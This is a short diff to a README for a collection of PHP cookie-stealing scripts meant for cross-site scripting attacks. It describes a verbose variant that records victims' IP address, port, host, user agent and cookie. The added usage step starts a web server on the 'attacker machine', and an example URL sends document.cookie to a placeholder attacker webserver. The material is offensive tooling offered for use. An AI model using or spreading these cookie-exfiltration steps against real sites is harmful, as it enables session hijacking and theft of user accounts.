@@ -10,6 +10,8 @@ PHP Cookie Stealing Scripts for use in XSS
 4. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.
 
 ## Usage
+1. On the attacker machine, start the webserver (Apache2 in example):
+sudo service apache2 start
 
 Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie
 
